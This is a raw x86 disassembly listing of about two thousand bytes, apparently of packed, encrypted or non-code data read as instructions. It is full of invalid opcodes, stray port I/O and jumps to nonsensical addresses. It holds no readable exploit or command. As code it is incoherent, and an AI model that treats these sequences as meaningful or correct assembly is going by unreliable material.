  408116:	outs   dx,BYTE PTR ds:[esi]
  408117:	jne    0x408187
  408119:	and    ecx,eax
  40811b:	cmc    
  40811c:	push   esi
  40811d:	imul   BYTE PTR [ebx-0x378e3d38]
  408123:	ret    0xb4c8
  408126:	dec    eax
  408127:	addr16 push esi
  408129:	call   0xd119:0x5d9fe4cb
  408130:	cmp    BYTE PTR [esi+0x9a3b61d],ah
  408136:	test   dh,bl
  408138:	shr    DWORD PTR [ecx],1
  40813a:	jl     0x4081ba
  40813c:	in     eax,0x5f
  40813e:	(bad)  
  40813f:	sbb    al,0xc0
  408141:	add    bh,BYTE PTR [ebp+0x15]
  408144:	bound  ecx,QWORD PTR [esi]
  408146:	pop    ebp
  408147:	addr16 push ss
  408149:	fld    QWORD PTR [ebx-0x1d]
  40814c:	inc    edi
  40814d:	adc    al,0x97
  40814f:	stos   BYTE PTR es:[edi],al
  408150:	sub    esi,DWORD PTR ds:0xe40c6326
  408156:	mov    esp,0xdffd001c
  40815b:	adc    bh,BYTE PTR [esi+eax*8]
  40815e:	ret    
  40815f:	jns    0x40818b
  408161:	lea    edx,[eax+ecx*8+0x402031ec]
  408168:	(bad)  
  408169:	aam    0x1b
  40816b:	pop    ss
  40816c:	fiadd  WORD PTR [ecx]
  40816e:	(bad)  
  408170:	mov    ?,WORD PTR [esi+0x22]
  408173:	mov    al,ds:0xf997e668
  408178:	push   0x32
  40817a:	inc    ecx
  40817b:	iret   
  40817c:	inc    esi
  40817d:	aad    0x32
  40817f:	sub    esi,edx
  408181:	test   DWORD PTR [esi+0x78c58467],0xd9d1506e
  40818b:	outs   dx,BYTE PTR ds:[esi]
  40818c:	push   cs
  40818d:	push   0x3c
  40818f:	jb     0xb96202c7
  408195:	mov    edi,0x70ccb3e4
  40819a:	nop    esp
  40819d:	sbb    eax,DWORD PTR [eax-0x3e732760]
  4081a3:	lea    ebx,[edx+0x7e27ec6b]
  4081a9:	ins    BYTE PTR es:[edi],dx
  4081aa:	mov    ecx,0xf9120411
  4081af:	dec    edi
  4081b0:	shl    BYTE PTR [edx+0x7a901a06],1
  4081b6:	iret   
  4081b7:	add    eax,0x7bf8d949
  4081bc:	shl    BYTE PTR [edx+eax*1+0x2d327473],1
  4081c3:	mov    ecx,0x25b677c1
  4081c8:	add    DWORD PTR [edx],0x35
  4081cb:	idiv   DWORD PTR [edx+0x31ac1b25]
  4081d1:	sub    DWORD PTR [ebp-0x24],edi
  4081d4:	std    
  4081d5:	mov    ebx,0x93823299
  4081da:	push   es
  4081db:	inc    edx
  4081dc:	(bad)  
  4081dd:	jns    0x408201
  4081df:	cmp    al,0x3e
  4081e1:	scas   eax,DWORD PTR es:[edi]
  4081e2:	and    edi,0x1
  4081e5:	outs   dx,BYTE PTR ds:[esi]
  4081e6:	cli    
  4081e7:	and    dl,ah
  4081e9:	stos   BYTE PTR es:[edi],al
  4081ea:	adc    DWORD PTR fs:[edx],esi
  4081ed:	call   0x47f9:0x4bbb3b76
  4081f4:	lods   al,BYTE PTR ds:[esi]
  4081f5:	mov    edi,0xf4c6f683
  4081fa:	(bad)  
  4081fb:	clc    
  4081fc:	lock rcr BYTE PTR [esi+ebp*2],0x7d
  408201:	add    BYTE PTR [esi+ecx*2-0x40],0xb8
  408206:	xor    DWORD PTR [eax+eax*2-0x4e],0x2999baa3
  40820e:	or     BYTE PTR [edi-0xb],dh
  408211:	loop   0x4081f9
  408213:	or     cl,BYTE PTR [edx+0x4cd03167]
  408219:	mov    eax,0x35dde2ac
  40821e:	xchg   ebx,eax
  40821f:	mov    eax,DWORD PTR [edi+0x5d]
  408222:	pop    ebp
  408223:	js     0x40827b
  408225:	ins    BYTE PTR es:[edi],dx
  408226:	inc    esi
  408227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408228:	sbb    eax,0xc1a23ddc
  40822d:	jge    0x40825e
  40822f:	aas    
  408230:	sbb    eax,0x33f621db
  408235:	adc    DWORD PTR ds:0xdce51f07,esi
  40823b:	adc    ebp,DWORD PTR [edi]
  40823d:	inc    edx
  40823e:	(bad)  
  40823f:	cmp    DWORD PTR [eax-0x14],edi
  408242:	ss in  eax,dx
  408244:	inc    ecx
  408245:	xor    DWORD PTR [esi-0x68],ecx
  408248:	jb     0x4082c1
  40824a:	push   DWORD PTR [eax-0xf3a451]
  408250:	call   0xe573:0xe05330c3
  408257:	fild   WORD PTR [eax]
  408259:	ficom  DWORD PTR [edi-0x4e76ebd1]
  40825f:	mov    edi,0x4300ca75
  408264:	sbb    edi,DWORD PTR [edx]
  408266:	jne    0x40824e
  408268:	push   edx
  408269:	outs   dx,BYTE PTR ds:[esi]
  40826a:	data16 jae 0x408247
  40826d:	adc    al,BYTE PTR [ebx+0x4be0099e]
  408273:	mov    bh,0xb0
  408275:	(bad)  ds:0x6945b8d2
  40827b:	add    DWORD PTR [ebx+0x77fc10bc],eax
  408281:	les    edi,FWORD PTR [ecx+ecx*4]
  408284:	out    0xb2,al
  408286:	jo     0x40825a
  408288:	jmp    0x408299
  40828a:	das    
  40828b:	or     DWORD PTR [edx],ebp
  40828d:	cli    
  40828e:	mov    dl,0xa6
  408290:	pushf  
  408291:	leave  
  408292:	dec    eax
  408293:	cmp    BYTE PTR [ebx+0x33],dl
  408296:	adc    DWORD PTR [edx],edi
  408298:	jecxz  0x40824c
  40829a:	mov    ah,0x7e
  40829c:	ins    DWORD PTR es:[edi],dx
  40829d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40829e:	out    0x9,eax
  4082a0:	scas   eax,DWORD PTR es:[edi]
  4082a1:	push   cs
  4082a2:	(bad)  
  4082a4:	sbb    BYTE PTR [edi+ebp*4+0x20244f00],cl
  4082ab:	loopne 0x40822f
  4082ad:	(bad)  
  4082ae:	jae    0x4082c5
  4082b0:	jecxz  0x4082c7
  4082b2:	stos   DWORD PTR es:[edi],eax
  4082b3:	aam    0x57
  4082b5:	cmc    
  4082b6:	in     eax,0x13
  4082b8:	jnp    0x4082f6
  4082ba:	pop    es
  4082bb:	push   esp
  4082bc:	cdq    
  4082bd:	lds    esi,FWORD PTR [edx+0x669844aa]
  4082c3:	or     ah,BYTE PTR [esi+eiz*4]
  4082c6:	mov    edi,0xedd52f08
  4082cb:	pop    ebx
  4082cc:	dec    eax
  4082cd:	fcomp  QWORD PTR [edx-0x264a879d]
  4082d3:	sahf   
  4082d4:	inc    ebx
  4082d5:	mov    DWORD PTR [edx+0x3190e4d9],esp
  4082db:	dec    edi
  4082dc:	pop    ebx
  4082dd:	push   esi
  4082de:	adc    cl,BYTE PTR [edi]
  4082e0:	xchg   ebp,eax
  4082e1:	leave  
  4082e2:	cmp    eax,0xbd1b253e
  4082e8:	cld    
  4082e9:	inc    eax
  4082ea:	jp     0x408341
  4082ec:	mov    ecx,ebx
  4082ee:	xor    DWORD PTR [ebx],0x287f8514
  4082f4:	fnstenv [ebx+0x20dbf352]
  4082fa:	nop
  4082fb:	mov    ecx,0x1f67ce91
  408300:	push   eax
  408301:	rol    BYTE PTR [edx],1
  408303:	loope  0x408305
  408305:	sahf   
  408306:	xor    al,0x95
  408308:	cdq    
  408309:	out    0x94,eax
  40830b:	jg     0x4082fd
  40830d:	dec    esp
  40830e:	adc    eax,0x722c3076
  408313:	mov    DWORD PTR [edi],0x45840ad4
  408319:	jmp    0xf30803c9
  40831e:	adc    eax,DWORD PTR [ebp+0x5153564]
  408324:	cmc    
  408325:	xor    eax,0xea898adf
  40832a:	dec    ebx
  40832b:	xchg   ebp,eax
  40832c:	dec    esp
  40832d:	inc    edi
  40832e:	push   eax
  40832f:	xor    DWORD PTR [ebp+0x1c],ebp
  408332:	sbb    BYTE PTR [ebx+0x54df33df],bh
  408338:	shr    DWORD PTR [ebx+0x3c6cea8a],1
  40833e:	imul   edi,DWORD PTR [esi],0x57
  408341:	inc    edx
  408342:	fld    DWORD PTR [ebx]
  408344:	or     al,0xa0
  408346:	bnd jl 0x40833b
  408349:	dec    edi
  40834a:	adc    bh,dh
  40834c:	arpl   bp,di
  40834e:	fcomp  QWORD PTR [ecx+0x2c]
  408351:	retf   0x5c44
  408354:	iret   
  408355:	sbb    eax,0xc4afd6aa
  40835a:	and    edi,DWORD PTR [edi]
  40835c:	ret    0x752d
  40835f:	jp     0x4083a9
  408361:	inc    esp
  408362:	push   edi
  408363:	pop    ss
  408364:	in     eax,0x23
  408366:	(bad)  
  408367:	out    0x99,eax
  408369:	xor    eax,0xbf564215
  40836e:	and    DWORD PTR [esi],esi
  408370:	fdivrp st(6),st
  408372:	out    dx,eax
  408373:	jae    0x408337
  408375:	jo     0x40834e
  408377:	jge    0x4083f6
  408379:	and    cl,BYTE PTR [edx+0x36]
  40837c:	or     eax,DWORD PTR [esi+0x4662c7a8]
  408382:	ja     0x408397
  408384:	inc    ebp
  408385:	fidivr WORD PTR [ebp+0x23d7415c]
  40838b:	gs cmc 
  40838d:	shr    DWORD PTR [edi-0x41b2d0d8],1
  408393:	push   ebx
  408394:	scas   eax,DWORD PTR es:[edi]
  408395:	mov    dl,0x49
  408397:	cmp    bl,bl
  408399:	fwait
  40839a:	xchg   edx,eax
  40839b:	retf   
  40839c:	stos   BYTE PTR es:[edi],al
  40839d:	hlt    
  40839e:	add    ebx,edx
  4083a0:	test   DWORD PTR ss:[ecx-0x24cfa6d0],0x9ef2b317
  4083ab:	xlat   BYTE PTR ds:[ebx]
  4083ac:	outs   dx,DWORD PTR ds:[esi]
  4083ad:	pop    edi
  4083ae:	sub    eax,DWORD PTR [edx-0x62]
  4083b1:	imul   edx,DWORD PTR [edx+0x79],0x72
  4083b5:	test   al,0x4e
  4083b7:	(bad)  
  4083b8:	cli    
  4083b9:	ins    BYTE PTR es:[edi],dx
  4083ba:	(bad)  
  4083bb:	into   
  4083bc:	or     DWORD PTR [ebp-0x3d2e7726],eax
  4083c2:	retf   0x72d8
  4083c5:	cwde   
  4083c6:	mov    esi,0xd48e6166
  4083cb:	jmp    0x99e613dc
  4083d0:	stos   DWORD PTR es:[edi],eax
  4083d1:	es cld 
  4083d3:	add    ecx,ecx
  4083d5:	mov    eax,ds:0x98af1708
  4083da:	mov    esi,0x527f551c
  4083df:	inc    esi
  4083e0:	pminsw mm1,QWORD PTR [esi+0x6f769577]
  4083e7:	fsub   DWORD PTR [edi+0x68f1380c]
  4083ed:	xchg   ebp,eax
  4083ee:	jmp    0x87daf027
  4083f3:	pushf  
  4083f4:	jno    0x40842b
  4083f6:	jbe    0x4083c9
  4083f8:	mov    eax,0xf0ae24a4
  4083fd:	push   0xffffffc5
  4083ff:	sbb    BYTE PTR ds:0x4344ffcd,al
  408405:	mov    al,ds:0x25d4fba9
  40840a:	pushf  
  40840b:	and    BYTE PTR [ebp+0x1bd44e07],al
  408411:	je     0x4083f6
  408413:	pushw  ds
  408415:	jge    0x4083c6
  408417:	outs   dx,BYTE PTR ds:[esi]
  408418:	push   0x49
  40841a:	(bad)  
  40841b:	aaa    
  40841c:	push   edx
  40841d:	aaa    
  40841e:	push   0xac13cd64
  408423:	stc    
  408424:	mov    ah,0x70
  408426:	or     ah,BYTE PTR [ebp+0x3bee9241]
  40842c:	fcom   DWORD PTR [edi+0x4473271]
  408432:	mov    dh,bh
  408434:	outs   dx,DWORD PTR ds:[esi]
  408435:	aam    0xf1
  408437:	rol    DWORD PTR [ecx+0x330274f3],1
  40843d:	xlat   BYTE PTR ds:[ebx]
  40843e:	cld    
  40843f:	out    0x1b,eax
  408441:	(bad)  
  408442:	(bad)  
  408444:	adc    eax,0x63c52b28
  408449:	aad    0x61
  40844b:	test   eax,0xc436c3f2
  408450:	sub    al,0xb0
  408452:	or     BYTE PTR [ecx-0x5],bl
  408455:	hlt    
  408456:	and    esp,DWORD PTR [eax]
  408458:	jle    0x4084ab
  40845a:	imul   edi,DWORD PTR [edi],0x6bb43728
  408460:	jno    0x408427
  408462:	sahf   
  408463:	sahf   
  408464:	mov    ebp,0x4e4f2178
  408469:	out    0x7e,eax
  40846b:	jmp    0x4084a1
  40846d:	das    
  40846e:	jnp    0x40841f
  408470:	add    ah,BYTE PTR [edx]
  408472:	pop    esp
  408473:	into   
  408474:	sar    esi,1
  408476:	sbb    DWORD PTR ds:0x8e719946,edx
  40847c:	add    ah,BYTE PTR [edx]
  40847e:	out    dx,eax
  40847f:	mov    bl,0x5a
  408481:	std    
  408482:	stos   BYTE PTR es:[edi],al
  408483:	xchg   esi,eax
  408484:	inc    esi
  408485:	push   cs
  408486:	enter  0xd875,0x47
  40848a:	shr    ah,1
  40848c:	iret   
  40848d:	or     DWORD PTR [esi-0x4976f026],ecx
  408493:	lods   al,BYTE PTR ds:[esi]
  408494:	int    0xb0
  408496:	xor    eax,0x277e76f0
  40849b:	pop    edx
  40849c:	daa    
  40849d:	ror    DWORD PTR [edi+0x6f325206],1
  4084a3:	mov    DWORD PTR [edi+0x46],ebx
  4084a6:	aad    0xd2
  4084a8:	popf   
  4084a9:	pop    edx
  4084aa:	enter  0x9d55,0x34
  4084ae:	out    dx,al
  4084af:	mov    edi,0x5709036a
  4084b4:	sub    eax,0xb61b83a3
  4084b9:	jecxz  0x408441
  4084bb:	imul   edi,DWORD PTR [eax+0x76173113],0xd
  4084c2:	sbb    BYTE PTR [edi-0x5675742],0xdc
  4084c9:	cmc    
  4084ca:	int3   
  4084cb:	les    eax,FWORD PTR [eax]
  4084cd:	inc    esi
  4084ce:	sub    edx,DWORD PTR [eax-0x539634e]
  4084d4:	mov    eax,0x2dd22405
  4084d9:	in     al,0x91
  4084db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084dc:	dec    ebp
  4084dd:	sbb    esi,DWORD PTR [ebp+0x42d5f694]
  4084e3:	mov    eax,0x4fe3d475
  4084e8:	out    dx,al
  4084e9:	or     DWORD PTR [eax],edi
  4084eb:	mov    ds:0xb4af6d9b,al
  4084f0:	sbb    edi,esp
  4084f2:	cmp    ebx,DWORD PTR [esi+edx*1-0x13fd273a]
  4084f9:	jno    0x4084de
  4084fb:	retf   
  4084fc:	fadd   st(6),st
  4084fe:	xchg   edi,eax
  4084ff:	jae    0x4084cd
  408501:	xchg   esp,eax
  408502:	int3   
  408503:	xor    BYTE PTR [edi],bl
  408505:	dec    BYTE PTR [edi-0x42]
  408508:	pop    edi
  408509:	inc    ebx
  40850a:	pop    ebp
  40850b:	sbb    al,0xe0
  40850d:	int3   
  40850e:	or     ebp,esi
  408510:	frstor [ebx-0x3edba440]
  408516:	lods   al,BYTE PTR ds:[esi]
  408517:	adc    dl,BYTE PTR [edx+ebp*4+0x1a2565d0]
  40851e:	add    eax,0x6ee994fc
  408523:	add    al,0x11
  408525:	adc    BYTE PTR [edi-0x65],dh
  408528:	(bad)  
  408529:	mov    ds:0x69a2c322,al
  40852e:	ins    DWORD PTR es:[edi],dx
  40852f:	inc    ecx
  408530:	xchg   ebx,eax
  408531:	inc    ecx
  408532:	jg     0x40859b
  408534:	(bad)  
  408535:	aas    
  408536:	xchg   DWORD PTR [ebp-0x4a1f546b],ecx
  40853c:	sbb    ebx,ebp
  40853e:	sub    ecx,ecx
  408540:	inc    ebx
  408541:	mov    eax,ds:0xc2b9dbc0
  408546:	pop    ds
  408547:	xchg   edi,eax
  408548:	pop    edx
  408549:	cmp    DWORD PTR [edi-0x47],0xffffffb2
  40854d:	jg     0x4085b3
  40854f:	mov    edx,DWORD PTR [edi+0x16d380d6]
  408555:	jle    0x408584
  408557:	pop    edi
  408558:	outs   dx,DWORD PTR ds:[esi]
  408559:	mov    bl,0x56
  40855b:	call   0x7fb3d1fb
  408560:	xor    BYTE PTR [edx+0x6e],bl
  408563:	in     eax,dx
  408564:	xor    eax,edx
  408566:	adc    BYTE PTR [edi+0x231ba857],al
  40856c:	in     eax,dx
  40856d:	(bad)  
  40856f:	mov    ecx,eax
  408571:	icebp  
  408572:	enter  0x2b7b,0xe4
  408576:	push   esi
  408577:	push   esp
  408578:	jo     0x40851d
  40857a:	repz ret 
  40857c:	sbb    al,0x19
  40857e:	push   eax
  40857f:	xor    eax,0x1f48f9aa
  408584:	ins    BYTE PTR es:[edi],dx
  408585:	fwait
  408586:	ret    
  408587:	sub    eax,0x1024bbd
  40858c:	in     eax,dx
  40858d:	fs xchg edx,eax
  40858f:	jmp    0x442a:0x62a8f1ad
  408596:	xchg   esi,eax
  408597:	popa   
  408598:	test   BYTE PTR [ebp-0x61],bl
  40859b:	in     al,0xb0
  40859d:	call   0x80b7c951
  4085a2:	jmp    0x6daa:0xd759551
  4085a9:	sub    DWORD PTR ds:0xc816e904,ecx
  4085af:	cld    
  4085b0:	jg     0x4085b5
  4085b2:	cmc    
  4085b3:	xor    al,0x69
  4085b5:	sbb    al,BYTE PTR [edi]
  4085b7:	int3   
  4085b8:	das    
  4085b9:	std    
  4085ba:	mov    cl,0x47
  4085bc:	in     al,dx
  4085bd:	xchg   ebp,eax
  4085be:	dec    ebx
  4085bf:	pop    eax
  4085c0:	loopne 0x408576
  4085c2:	stc    
  4085c3:	push   eax
  4085c4:	jge    0x4085ad
  4085c6:	pop    ecx
  4085c7:	gs push ebp
  4085c9:	out    0x3d,eax
  4085cb:	pushf  
  4085cc:	jmp    0x6a13acf2
  4085d1:	jp     0x40856c
  4085d3:	pusha  
  4085d4:	sti    
  4085d5:	je     0x40862c
  4085d7:	jnp    0x4085a0
  4085d9:	inc    ebp
  4085da:	hlt    
  4085db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085dc:	test   DWORD PTR [eax+edi*8-0x1603ba75],ebx
  4085e3:	stos   BYTE PTR es:[edi],al
  4085e4:	and    eax,DWORD PTR [eax]
  4085e6:	add    BYTE PTR ds:0x84488431,bl
  4085ec:	les    ebx,FWORD PTR [ebp+0xc292524]
  4085f2:	push   0x6f
  4085f4:	fadd   QWORD PTR [edi-0x51]
  4085f7:	jns    0x408612
  4085f9:	add    DWORD PTR [ebx-0x7c7c9f0f],0xffffffa3
  408600:	adc    DWORD PTR [edi+0x583c5004],esp
  408606:	(bad)  
  408607:	jns    0x408660
  408609:	xchg   BYTE PTR [ebx+0xb],dh
  40860c:	mov    ds,WORD PTR [eax+0x7a]
  40860f:	outs   dx,DWORD PTR ds:[esi]
  408610:	ret    
  408611:	jle    0x4085b4
  408613:	mov    fs,esi
  408615:	add    esp,DWORD PTR [ebx+0x78e3b9fa]
  40861b:	jne    0x408660
  40861d:	jo     0x4085eb
  40861f:	sbb    esi,edi
  408621:	mov    ebp,0x27ffe50e
  408626:	inc    ebx
  408627:	push   edi
  408628:	sahf   
  408629:	shl    esp,cl
  40862b:	sbb    DWORD PTR ds:0xfa84eeeb,edx
  408631:	pop    edi
  408632:	outs   dx,BYTE PTR ds:[esi]
  408633:	cmp    BYTE PTR [ecx+0x63],ah
  408636:	pop    ds
  408637:	das    
  408638:	push   edi
  408639:	gs pusha 
  40863b:	dec    ebx
  40863c:	mov    ecx,DWORD PTR [ebp+0x2d]
  40863f:	jb     0x408629
  408641:	add    ebx,DWORD PTR [ebp-0x48]
  408644:	cmp    eax,0x6e6c4f8d
  408649:	pushf  
  40864a:	inc    esp
  40864b:	push   es
  40864c:	and    DWORD PTR [ebx-0x6c8e3d4a],esi
  408652:	js     0x40861d
  408654:	mov    ds:0xb36a4b8,al
  408659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40865a:	inc    ecx
  40865b:	lods   eax,DWORD PTR ds:[esi]
  40865c:	xchg   DWORD PTR [eax+0x19],esp
  40865f:	mov    eax,0xe9564ef0
  408664:	ret    0x29c2
  408667:	out    0x83,eax
  408669:	pop    ebp
  40866a:	pop    edi
  40866b:	inc    ebp
  40866c:	arpl   sp,sp
  40866e:	mov    dh,0xa9
  408670:	adc    eax,0x9f986819
  408675:	inc    ecx
  408676:	in     eax,0x20
  408678:	jg     0x408657
  40867a:	pop    es
  40867b:	pop    edi
  40867c:	call   0x14a4b3a3
  408681:	jb     0x4086ba
  408683:	sbb    ecx,DWORD PTR [eax+0xc]
  408686:	test   eax,0x6bdfd859
  40868b:	or     al,0x59
  40868d:	xchg   esi,eax
  40868e:	push   esp
  40868f:	cld    
  408690:	add    ecx,edx
  408692:	jnp    0x40869a
  408694:	outs   dx,BYTE PTR ds:[esi]
  408695:	lock lods eax,DWORD PTR ds:[esi]
  408697:	and    DWORD PTR [ecx+ebx*2+0x7f],ebp
  40869b:	cdq    
  40869c:	xor    cl,BYTE PTR [edx+0x16109f67]
  4086a2:	fcomip st,st(6)
  4086a4:	ror    BYTE PTR [edi],1
  4086a6:	loopne 0x40870f
  4086a8:	pop    ebp
  4086a9:	push   edx
  4086aa:	dec    esp
  4086ab:	stc    
  4086ac:	jg     0x4086a4
  4086ae:	popf   
  4086af:	or     ecx,esp
  4086b1:	dec    edx
  4086b2:	push   ecx
  4086b3:	imul   edx,DWORD PTR [eax+0x6cb6264c],0xffffffab
  4086ba:	lods   eax,DWORD PTR ds:[esi]
  4086bc:	inc    edi
  4086bd:	jnp    0x4086c7
  4086bf:	jl     0x408661
  4086c1:	sahf   
  4086c2:	xlat   BYTE PTR ds:[ebx]
  4086c3:	cmp    ebx,DWORD PTR [edx+0x6bedf8cb]
  4086c9:	imul   eax,DWORD PTR [esp+esi*2-0x3f],0x68
  4086ce:	leave  
  4086cf:	inc    esp
  4086d0:	les    ecx,FWORD PTR [ecx]
  4086d2:	test   BYTE PTR fs:[ebx],bh
  4086d5:	scas   al,BYTE PTR es:[edi]
  4086d6:	cmp    ebp,DWORD PTR [edx+0x4930abf9]
  4086dc:	adc    ah,dl
  4086de:	ds stos BYTE PTR es:[edi],al
  4086e0:	sbb    eax,0xba3c38c9
  4086e5:	dec    ebp
  4086e6:	jle    0x4086df
  4086e8:	aam    0x8a
  4086ea:	sub    bh,BYTE PTR [edx-0x2257f127]
  4086f0:	jmp    0x70506c60
  4086f5:	push   0xfffffff9
  4086f7:	xchg   edx,eax
  4086f8:	pop    eax
  4086f9:	(bad)  
  4086fa:	stos   BYTE PTR es:[edi],al
  4086fb:	(bad)  
  4086fc:	rol    DWORD PTR [ebx-0x4a533dad],cl
  408702:	fwait
  408703:	loopne 0x4086eb
  408705:	jp     0x408716
  408707:	loop   0x4086b7
  408709:	lea    edi,[ecx]
  40870b:	inc    esi
  40870c:	xchg   edx,eax
  40870d:	add    DWORD PTR [ecx+ebx*1],esp
  408710:	repz cmp al,BYTE PTR [ecx-0x61]
  408714:	ss jb  0x4086fb
  408717:	popa   
  408718:	adc    al,0xe2
  40871a:	mov    al,0xcf
  40871c:	hlt    
  40871d:	rcl    ebx,0x83
  408720:	and    BYTE PTR gs:[esi-0x741054c8],bh
  408727:	inc    ebx
  408728:	cmp    bl,BYTE PTR [edx-0x2187d865]
  40872e:	sub    ch,BYTE PTR [eax]
  408730:	jp     0x408760
  408732:	inc    esp
  408733:	mov    edx,0xd7370ce7
  408738:	iret   
  408739:	(bad)  
  40873a:	out    dx,eax
  40873b:	or     eax,0x33a4efe
  408740:	push   esp
  408741:	push   esp
  408742:	mov    cl,0x46
  408744:	xchg   ecx,eax
  408745:	cs ret 
  408747:	pop    edi
  408748:	mov    ds:0xaab27ba8,al
  40874d:	call   0x9560d1b3
  408752:	in     eax,0xaa
  408754:	mov    edx,0x67765a70
  408759:	pop    ss
  40875a:	sub    al,BYTE PTR [ebp-0x13e8e46]
  408760:	mov    bh,0x1a
  408762:	jmp    0x408772
  408764:	fmul   QWORD PTR [ecx+0x5a]
  408767:	mov    cs,WORD PTR [ebp+0x373dc116]
  40876d:	fist   DWORD PTR [esi-0x21ec0e63]
  408773:	mov    cl,0xac
  408775:	push   edx
  408776:	pop    es
  408777:	pushf  
  408778:	inc    edx
  408779:	push   esi
  40877a:	call   FWORD PTR [edx+0x12]
  40877d:	je     0x40872c
  40877f:	sbb    al,0x2f
  408781:	mov    bl,0xbc
  408783:	rcr    bh,cl
  408785:	jge    0x408806
  408787:	ret    
  408788:	fstenv [ecx-0x64c66918]
  40878f:	cmp    eax,0xee256e45
  408794:	and    BYTE PTR [eax],ah
  408796:	jg     0x40872c
  408798:	out    0x37,al
  40879a:	jb     0x408761
  40879c:	cli    
  40879d:	aas    
  40879e:	push   cs
  40879f:	fcom   QWORD PTR [edi]
  4087a1:	rcr    DWORD PTR [edi+0x6621900c],0xa8
  4087a8:	(bad)  
  4087a9:	jno    0x408760
  4087ab:	push   ds
  4087ac:	sbb    al,0xd2
  4087ae:	int    0xac
  4087b0:	pop    eax
  4087b1:	jnp    0x408734
  4087b3:	ret    
  4087b4:	push   ebp
  4087b5:	sbb    DWORD PTR [edx-0x29e7f285],esp
  4087bb:	jmp    0x408786
  4087bd:	fwait
  4087be:	out    dx,al
  4087bf:	pop    esp
  4087c0:	sub    al,0xab
  4087c2:	jp     0x408819
  4087c4:	cmp    al,0x2
  4087c6:	jmp    0xd42d:0xfa4195fa
  4087cd:	jl     0x408832
  4087cf:	(bad)  
  4087d0:	fistp  DWORD PTR [ebx]
  4087d2:	cdq    
  4087d3:	sahf   
  4087d4:	dec    ebx
  4087d5:	outs   dx,BYTE PTR ds:[esi]
  4087d6:	add    cl,ch
  4087d8:	pop    ds
  4087d9:	xchg   esi,eax
  4087da:	inc    ebx
  4087db:	popa   
  4087dc:	push   ebx
  4087dd:	sbb    al,0xd
  4087df:	push   esi
  4087e0:	daa    
  4087e1:	add    al,0x5b
  4087e3:	pop    esi
  4087e4:	or     ah,ch
  4087e6:	(bad)  
  4087e7:	scas   eax,DWORD PTR es:[edi]
  4087e8:	sub    ecx,esi
  4087ea:	mov    bh,0xac
  4087ec:	cmp    al,0x1a
  4087ee:	ficomp DWORD PTR [esp+ecx*2+0xcf63e73]
  4087f5:	push   edx
  4087f6:	ret    
  4087f7:	xchg   esp,esi
  4087f9:	jge    0x4087e6
  4087fb:	ins    DWORD PTR es:[edi],dx
  4087fc:	mov    bl,0x3d
  4087fe:	loopne 0x4087a5
  408800:	inc    esi
  408801:	push   eax
  408802:	push   ds
  408803:	jnp    0x408830
  408805:	fisttp WORD PTR [edi-0x2f58843f]
  40880b:	and    eax,0xa7efbb90
  408810:	push   cs
  408811:	out    dx,al
  408812:	push   ss
  408813:	xchg   esp,eax
  408814:	icebp  
  408815:	xchg   ebp,eax
  408816:	daa    
  408817:	pop    esi
  408818:	out    0xae,al
  40881a:	fwait
  40881b:	js     0x4087fd
  40881d:	jbe    0x40885e
  40881f:	adc    bh,BYTE PTR [ecx]
  408821:	popa   
  408822:	mov    edx,0x1cc05d4c
  408827:	stos   BYTE PTR es:[edi],al
  408828:	add    DWORD PTR [edx+0x58d1248a],0xffffff9e
  40882f:	ins    DWORD PTR es:[edi],dx
  408830:	out    0x9f,al
  408832:	out    0xab,eax
  408834:	cld    
  408835:	in     eax,0x8d
  408837:	mov    ds:0x48de1e51,al
  40883c:	pop    esp
  40883d:	mov    ds:0x7474f0f6,eax
  408842:	push   edx
  408843:	pop    esp
  408844:	cmc    
  408845:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408846:	mov    DWORD PTR [ebx],edi
  408848:	cmp    ebp,DWORD PTR [edi]
  40884a:	dec    edi
  40884b:	mov    DWORD PTR [ebx+0x1e],ebp
  40884e:	push   ebp
  40884f:	loopne 0x40884f
  408851:	inc    bx
  408853:	ds and al,0x2c
  408856:	cmp    DWORD PTR [ebx+0x2e27436d],edx
  40885c:	js     0x4088b1
  40885e:	xlat   BYTE PTR ds:[ebx]
  40885f:	dec    ebx
  408860:	or     bh,BYTE PTR [eax+0x1ad4e8fc]
  408866:	pusha  
  408867:	add    eax,0x93308f6
  40886c:	pop    esp
  40886d:	push   ss
  40886e:	aas    
  40886f:	int    0xc1
  408871:	arpl   WORD PTR [edi-0x8],dx
  408874:	pushf  
  408875:	and    esi,edx
  408877:	test   eax,0x1a4a6b64
  40887c:	cli    
  40887d:	pop    edi
  40887e:	stc    
  40887f:	mov    bl,BYTE PTR [edx]
  408881:	shl    BYTE PTR [ecx+0x59],cl
  408884:	fcom   QWORD PTR [edi-0x2f]
  408887:	adc    edx,0xffffffbf
  40888a:	ins    DWORD PTR es:[edi],dx
  40888b:	into   
  40888c:	test   BYTE PTR [esi-0x60],cl
  40888f:	out    dx,eax
  408890:	jp     0x4088dd
  408892:	mov    ebx,0x7267fd55
  408897:	sar    ebp,0xdd
  40889a:	pusha  
  40889b:	daa    
  40889c:	xlat   BYTE PTR ds:[ebx]
  40889d:	sbb    BYTE PTR [ecx+0x39],cl
  4088a0:	es popaw 
  4088a3:	frstor [edx-0x547abc38]
  4088a9:	and    DWORD PTR [ecx+edi*2-0x24],0xffffffb9
  4088ae:	ss dec edi
  4088b0:	(bad)  
  4088b1:	sub    eax,0xe1ae8cde
  4088b6:	xchg   edi,eax
  4088b7:	pop    ebp
  4088b8:	pushf  
  4088b9:	mov    ds:0xf3719c38,al
  4088be:	and    DWORD PTR [edi],0x75dc7993
  4088c4:	jg     0x408887
  4088c6:	push   ss
  4088c7:	mov    eax,0x2d7bed1c
  4088cc:	les    ebx,FWORD PTR [ebx]
  4088ce:	ins    BYTE PTR es:[edi],dx
  4088cf:	mov    eax,ds:0xaeda40e6
  4088d4:	imul   ebp,edx,0xffffffb2
  4088d7:	fs rcl ah,cl
  4088da:	jp     0x40890a
  4088dc:	mov    eax,ds:0xbcb4ee78
  4088e1:	sub    eax,0xd5c1f298
  4088e6:	cmp    ecx,edi
  4088e8:	ja     0x40894e
  4088ea:	(bad)  
  4088ec:	ret    
  4088ed:	mov    esi,0xc747d444
  4088f2:	mov    dh,0x85
  4088f4:	retf   
  4088f5:	mov    ebp,0x57075417
  4088fa:	out    dx,al
  4088fb:	std    
  4088fc:	pusha  
  4088fd:	pop    es
  4088fe:	mov    cl,0x8a
